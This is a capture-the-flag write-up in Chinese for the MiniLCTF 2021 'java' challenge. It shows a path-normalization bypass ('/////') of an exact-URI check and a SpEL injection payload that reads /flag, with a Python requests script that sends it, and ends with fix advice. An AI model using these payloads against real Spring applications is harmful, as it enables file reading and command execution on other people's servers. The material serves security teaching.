# MiniLCTF 2021 - java

## 题目简述

附件是 Spring Boot 1.5.3 应用。根路由接收参数 `code`，使用 `SpelExpressionParser.parseExpression(code).getValue()` 直接求值，但先检查 `request.getRequestURI().equals("/")`；请求 URI 恰为 `/` 时返回 `nonono`。需要利用容器路由规范化与原始 URI 字符串不一致，进入控制器后触发任意 SpEL 表达式求值并读取 `/flag`。

## 解题过程

对 `MainController` 执行 `javap -c -p` 可还原关键逻辑：

```java
String uri = request.getRequestURI();
if (uri.equals("/")) {
    return "nonono";
}
if (code != null) {
    return parser.parseExpression(code).getValue().toString();
}
return "so?";
```

Tomcat/Spring 会把多个连续斜杠仍路由到根控制器，但 `getRequestURI()` 保留的字符串不是单个 `/`。因此访问 `/////` 可绕过精确相等判断。

SpEL 支持构造 Java 对象，直接使用文件流读取首行：

```text
(new java.io.BufferedReader(new java.io.FileReader('/flag'))).readLine()
```

发送时对表达式做 URL 编码：

```python
import requests

base = "http://127.0.0.1:8080/////"
expr = "(new java.io.BufferedReader(new java.io.FileReader('/flag'))).readLine()"
r = requests.get(base, params={"code": expr})
print(r.text)
```

也可以调用 `T(java.nio.file.Files).readAllLines(...)`，但两种写法的本质相同：未设置安全求值上下文的 SpEL 能访问任意类型和构造器。公开比赛实例返回过 UUID 形式的动态 flag，仓库并未保存同一个运行值，因此不写死历史实例值。

## 方法总结

这条利用链包含两个独立问题：用字符串精确比较原始 URI 进行访问控制，以及对用户输入执行完整 SpEL。前者可被等价路径表示绕过，后者直接提供文件读取乃至命令执行。修复时应在路由层做规范化后的授权，并删除表达式求值；仅靠拦截某几个路径或 SpEL 关键字都不可靠。
